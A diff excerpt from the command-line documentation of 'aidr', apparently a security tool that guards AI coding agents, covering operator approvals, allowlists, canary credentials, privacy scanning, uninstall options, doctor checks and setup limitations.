+| `aidr approve [id]` | `--ttl <minutes>` (1–1440, default 15), `--permit-allowlist`, `-y, --yes` (full id only), `--json` | Operator only: approve one retry. The id may be its first 8+ characters; with no id, a terminal shows a numbered list to pick from |
 | `aidr allowlist list` | `--json` | Show entries (commands as hashes) |
 | `aidr allowlist add <type> <value>` | `--reason <text>`, `-y, --yes` | Operator only: permanent exception (`url`, `command`, `file_path`) |
 | `aidr allowlist remove <type> <value>` | — | Remove an entry (command text or hash prefix) |
@@ -2231,7 +2304,7 @@ Commands, from `packages/cli/src/index.ts`:
 | `aidr canary deploy \| list \| remove \| status` | `--path <dir>`, `--kinds <list>`, `--all`, `--json` | Operator only: canary credentials |
 | `aidr compliance verify <report>` | `--public-key <file>`, `--require-signature`, `--json` | Verify a compliance evidence report offline |
 | `aidr privacy scan [file]` | `--json`, `--mask`, `--types <list>`, `--fail-on none\|any\|secret` (default `any`) | Local TR/EN personal-data and secret scan of a file or stdin (TCKN, IBAN, phone, e-mail, card, secrets, ...); prints type, count and line, never the value; `--mask` prints a `[TYPE]`-redacted copy; exit `0` clean, `2` findings, `3` incomplete inspection, `1` error |
-| `aidr uninstall` | `--home <path>`, `--json` | Remove only AIDR-managed hooks (Claude Code endpoint-installer receipt), preserving your own |
+| `aidr uninstall` | `--home <path>`, `--json`, `--keep-data`, `--dry-run`, `--host <ids>`, `--hooks-only`, `-y, --yes` | Remove AIDR (confirmation required): the connector of every AI tool, the AIDR-managed hooks, `~/.singularity-aidr` and the AIDR vault items; your own hooks stay |
 
 `--secret-store` accepts `windows-dpapi`, `macos-keychain`, `linux-secret-service` or
 `file-acl` (default: detect the OS vault).
@@ -2244,7 +2317,9 @@ Install the approved version from the private registry
 
 ```bash
 $ aidr doctor
-# checks: configuration, detection, connectors, dlp, operator_approvals, last_verdict, core_version
+# checks: configuration, integrity, detection, connectors, dlp, agent_profiles,
+#         operator_approvals, agent_environment, last_verdict, core_version
+$ aidr doctor --verbose   # the same, with the reason, path and fix under each line
 ```
 
 **Availability**
@@ -2254,10 +2329,12 @@ $ aidr doctor
 | Free, Team, Business, Enterprise (`--upload` and posture features: Business, Enterprise) | Local; Cloud, On-prem, Air-gapped | Windows, Linux, macOS |
 
 **Limitations**
-- `aidr setup` does not install or activate a connector; connector installation follows
-  each connector's guide.
-- `aidr uninstall` currently supports the Claude Code endpoint-installer receipt only and
-  refuses to act without a verified receipt.
+- `aidr setup` installs a connector only where the AI tool's own command line or
+  configuration allows it; Codex hooks must still be trusted once with `/hooks`, and
+  Cursor and VS Code need "Singularity AIDR: Enable protection". `aidr status` names each
+  remaining manual step.
+- `aidr update` updates only installations made with the Windows or Linux installers; npm,
+  plugin and VSIX installs are updated the way they were installed.
 - `aidr doctor` does not inspect Cursor/VS Code hooks; use the extension's **Show hook
   health**.
 
